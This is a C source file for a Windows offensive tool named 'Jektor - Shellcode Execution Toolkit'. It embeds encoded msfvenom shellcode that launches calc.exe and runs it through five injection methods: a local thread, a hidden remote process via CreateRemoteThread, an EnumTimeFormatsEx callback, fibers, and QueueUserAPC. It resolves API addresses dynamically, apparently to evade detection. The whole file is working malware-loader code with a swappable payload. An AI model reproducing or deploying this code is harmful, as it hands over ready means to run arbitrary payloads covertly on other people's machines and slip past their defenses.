#include <windows.h>
#include <stdio.h>

// sudo msfvenom -p windows/x64/exec cmd=calc.exe -b '\x00' -f c
unsigned char shellcodeBuf64[] =
"\x90\x90\x90"
"\xeb\x27\x5b\x53\x5f\xb0\x4e\xfc\xae\x75\xfd\x57\x59\x53\x5e"
"\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f\x94\x3c"
"\x74\x07\x80\x3e\x4e\x75\xea\xeb\xe6\xff\xe1\xe8\xd4\xff\xff"
"\xff\x07\x4e\xfb\x4f\x84\xe3\xf7\xef\xc7\x07\x07\x07\x46\x56"
"\x46\x57\x55\x56\x51\x4f\x36\xd5\x62\x4f\x8c\x55\x67\x4f\x8c"
"\x55\x1f\x4f\x8c\x55\x27\x4f\x8c\x75\x57\x4f\x08\xb0\x4d\x4d"
"\x4a\x36\xce\x4f\x36\xc7\xab\x3b\x66\x7b\x05\x2b\x27\x46\xc6"
"\xce\x0a\x46\x06\xc6\xe5\xea\x55\x46\x56\x4f\x8c\x55\x27\x8c"
"\x45\x3b\x4f\x06\xd7\x8c\x87\x8f\x07\x07\x07\x4f\x82\xc7\x73"
"\x60\x4f\x06\xd7\x57\x8c\x4f\x1f\x43\x8c\x47\x27\x4e\x06\xd7"
"\xe4\x51\x4f\xf8\xce\x46\x8c\x33\x8f\x4f\x06\xd1\x4a\x36\xce"
"\x4f\x36\xc7\xab\x46\xc6\xce\x0a\x46\x06\xc6\x3f\xe7\x72\xf6"
"\x4b\x04\x4b\x23\x0f\x42\x3e\xd6\x72\xdf\x5f\x43\x8c\x47\x23"
"\x4e\x06\xd7\x61\x46\x8c\x0b\x4f\x43\x8c\x47\x1b\x4e\x06\xd7"
"\x46\x8c\x03\x8f\x4f\x06\xd7\x46\x5f\x46\x5f\x59\x5e\x5d\x46"
"\x5f\x46\x5e\x46\x5d\x4f\x84\xeb\x27\x46\x55\xf8\xe7\x5f\x46"
"\x5e\x5d\x4f\x8c\x15\xee\x50\xf8\xf8\xf8\x5a\x4f\xbd\x06\x07"
"\x07\x07\x07\x07\x07\x07\x4f\x8a\x8a\x06\x06\x07\x07\x46\xbd"
"\x36\x8c\x68\x80\xf8\xd2\xbc\xf7\xb2\xa5\x51\x46\xbd\xa1\x92"
"\xba\x9a\xf8\xd2\x4f\x84\xc3\x2f\x3b\x01\x7b\x0d\x87\xfc\xe7"
"\x72\x02\xbc\x40\x14\x75\x68\x6d\x07\x5e\x46\x8e\xdd\xf8\xd2"
"\x64\x66\x6b\x64\x29\x62\x7f\x62\x07\x94\x3c";

HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");

typedef PVOID(WINAPI* VirtualAllocAddr)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* CreateThreadAddr)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, __drv_aliasesMem LPVOID, DWORD, LPDWORD);
typedef PVOID(WINAPI* CreateProcessWAddr)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
typedef PVOID(WINAPI* OpenProcessAddr)(DWORD, BOOL, DWORD);
typedef PVOID(WINAPI* WriteProcessMemoryAddr)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef PVOID(WINAPI* VirtualAllocExAddr)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI* CreateRemoteThreadAddr)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);

VirtualAllocAddr pVirtualAlloc = (VirtualAllocAddr)GetProcAddress(hKernel32, "VirtualAlloc");
CreateThreadAddr pCreateThread = (CreateThreadAddr)GetProcAddress(hKernel32, "CreateThread");
CreateProcessWAddr pCreateProcessW = (CreateProcessWAddr)GetProcAddress(hKernel32, "CreateProcessW");
OpenProcessAddr pOpenProcess = (OpenProcessAddr)GetProcAddress(hKernel32, "OpenProcess");
WriteProcessMemoryAddr pWriteProcessMemory = (WriteProcessMemoryAddr)GetProcAddress(hKernel32, "WriteProcessMemory");
VirtualAllocExAddr pVirtualAllocEx = (VirtualAllocExAddr)GetProcAddress(hKernel32, "VirtualAllocEx");
CreateRemoteThreadAddr pCreateRemoteThread = (CreateRemoteThreadAddr)GetProcAddress(hKernel32, "CreateRemoteThread");

#pragma comment(lib, "ntdll")
using NtTestAlert = NTSTATUS(NTAPI*)();

void LocalSelfInjection()
{
	printf("[>] Local/Self Shellcode Execution Using CreateThread\n\n");

	printf("[+] Resolved the address for VirtualAlloc dynamically - 0x%p\n", pVirtualAlloc);
	printf("[+] Resolved the address for CreateThread dynamically - 0x%p\n\n", pCreateThread);

	LPVOID shellcodeMem = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeMem != NULL)
	{
		printf("[+] Allocated a memory region for the shellcode payload - 0x%p\n", shellcodeMem);

		if (RtlCopyMemory(shellcodeMem, shellcodeBuf64, sizeof(shellcodeBuf64)))
		{
			printf("[+] Moved the shellcode payload into the allocated memory region\n");

			DWORD shellcodeThreadId = 1;
			HANDLE shellcodeExec = pCreateThread(NULL, 0, LPTHREAD_START_ROUTINE(shellcodeMem), 0, 0, &shellcodeThreadId);

			if (shellcodeExec != NULL)
			{
				printf("[+] Executed shellcode from a newly created thread - [TID] %u\n", shellcodeThreadId);
			}
			WaitForSingleObject(shellcodeExec, 500);
		}
	}
}

void RemoteShellcodeInjection()
{
	printf("[>] Remotely execute shellcode in a hidden notepad process\n\n");

	printf("[+] Resolved the address for CreateProcessW dynamically - 0x%p\n", pCreateProcessW);
	printf("[+] Resolved the address for OpenProcess dynamically - 0x%p\n", pOpenProcess);
	printf("[+] Resolved the address for VirtualAllocEx dynamically - 0x%p\n", pVirtualAllocEx);
	printf("[+] Resolved the address for WriteProcessMemory dynamically - 0x%p\n", pWriteProcessMemory);
	printf("[+] Resolved the address for CreateRemoteThread dynamically - 0x%p\n\n", pCreateRemoteThread);

	STARTUPINFO startupInfo = { 0 };
	PROCESS_INFORMATION processInfo = { 0 };
	PVOID newNotepad = pCreateProcessW(L"C:\\WINDOWS\\system32\\RuntimeBroker.exe", NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo);
	if (newNotepad)
	{
		printf("[+] Spawned a hidden notepad.exe process - [PID] %i\n", processInfo.dwProcessId);

		HANDLE openNotepad = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, processInfo.dwProcessId);
		if (openNotepad != NULL)
		{
			printf("[+] Opened a handle to the hidden notepad.exe process by PID - 0x%x\n", openNotepad);

			PVOID allocNotepad = pVirtualAllocEx(openNotepad, NULL, sizeof(shellcodeBuf64), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
			if (allocNotepad != NULL)
			{
				printf("[+] Remotely allocated a memory region for the shellcode payload\n");
				printf("[+] Base address of the allocated region - 0x%p\n", allocNotepad);

				LPVOID writePayloadNotepad = pWriteProcessMemory(openNotepad, allocNotepad, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);

				if (writePayloadNotepad != 0)
				{
					printf("[+] Wrote the shellcode payload into the remote process\n");

					DWORD lpThreadId = 1;
					HANDLE execRemotePayload = pCreateRemoteThread(openNotepad, NULL, 0, LPTHREAD_START_ROUTINE(allocNotepad), NULL, 0, &lpThreadId);
					if (execRemotePayload != NULL)
					{
						printf("[+] Executed the payload within a remotely created thread - [TID] %u\n", lpThreadId);
					}
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
					CloseHandle(openNotepad);
				}
			}
		}
	}
}

void EnumTimeFormatsExInjection()
{
	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (allocShellcode != NULL)
	{
		printf("[+] Allocated a region of memory for the shellcode - 0x%p\n", allocShellcode);

		if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
		{
			printf("[+] Copied the shellcode payload into the allocated memory\n");

			printf("[+] Executed shellcode via enumerating time formats\n");
			EnumTimeFormatsEx(TIMEFMT_ENUMPROCEX(allocShellcode), LOCALE_NAME_USER_DEFAULT, 0, NULL);
		}
	}
}

void CreateFiberInjection()
{
	printf("[>] Locally execute shellcode using Windows Fibers\n\n");

	HANDLE currentThread = GetCurrentThread();

	LPVOID convertThreadFiber = ConvertThreadToFiber(NULL);
	if (convertThreadFiber != NULL) {
		printf("[+] Converted the main thread to a fiber\n");

		LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (allocShellcode != NULL)
		{
			printf("[+] Allcoated a region of memory for the shellcode - 0x%p\n", allocShellcode);

			if (memcpy(allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64)))
			{
				printf("[+] Copied the shellcode payload into the allocated memory\n");

				LPVOID createNewFiber = CreateFiber(0, LPFIBER_START_ROUTINE(allocShellcode), NULL);
				if (createNewFiber != NULL) {
					printf("[+] Created a new fiber including the shellcode payload - 0x%p\n", createNewFiber);

					printf("[+] Executed the shellcode payload using fibers\n");
					SwitchToFiber(createNewFiber);
					DeleteFiber(createNewFiber);
				}
			}
		}
	}
}

void QueueUserAPCInjection()
{
	printf("[>] Remotely execute shellcode via QueueUserAPC injection\n\n");

	LPVOID allocShellcode = pVirtualAlloc(NULL, sizeof(shellcodeBuf64), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (allocShellcode != NULL)
	{
		printf("[+] Allocated a region of RWX memory for the shellcode - 0x%p\n", allocShellcode);

		HANDLE currentProc = GetCurrentProcess();
		printf("[+] Opened a handle to the current process - 0x%x\n", currentProc);

		PVOID writeShellcode = pWriteProcessMemory(currentProc, allocShellcode, shellcodeBuf64, sizeof(shellcodeBuf64), NULL);
		if (writeShellcode != 0)
		{
			printf("[+] Wrote the shellcode payload to the allocated memory region\n");

			HANDLE currentThread = GetCurrentThread();
			printf("[+] Opened a handle to the current thread - 0x%x\n", currentThread);
			PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE(allocShellcode));

			DWORD queueApc = QueueUserAPC((PAPCFUNC)apcRoutine, currentThread, NULL);
			if (queueApc != 0)
			{
				printf("[+] Queued a malicious APC routine in the current thread\n");

				NtTestAlert pTestAlert = (NtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
				printf("[+] Dynamically resolved the address of NtTestAlert from NTDLL - 0x%p\n", pTestAlert);
				if (pTestAlert())
				{
					printf("[+] Detonated the shellcode via NtTestAlert from an APC routine\n");
				}
			}
			CloseHandle(currentThread);
			CloseHandle(currentProc);
		}
	}
}

int main(int argc, char* argv[])
{
	if (argc == 1)
	{
		fprintf(stdout,
			"\nJektor - Shellcode Execution Toolkit\n\n"
			"\tUsage    Injection type description\n"
			"\t-----    -----------------------------------------------------------------\n"
			"\t/LIJ     Execute shellcode in a local thread (CreateThread)\n"
			"\t/RIJ     Execute shellcode in a remote hidden process (CreateRemoteThread)\n"
			"\t/TIJ     Execute shellcode via EnumTimeFormatsEx\n"
			"\t/FIJ     Execute shellcode via Fibers (CreateFiber)\n"
			"\t/QIJ     Execute shellcode remotely via APC routines (QueueUserAPC) \n");
	}
	if (strcmp(argv[1], "/LIJ") == 0)
	{
		LocalSelfInjection();
	}
	if (strcmp(argv[1], "/RIJ") == 0)
	{
		RemoteShellcodeInjection();
	}
	if (strcmp(argv[1], "/TIJ") == 0)
	{
		EnumTimeFormatsExInjection();
	}
	if (strcmp(argv[1], "/FIJ") == 0)
	{
		CreateFiberInjection();
	}
	if (strcmp(argv[1], "/QIJ") == 0)
	{
		QueueUserAPCInjection();
	}
	return 0;
}
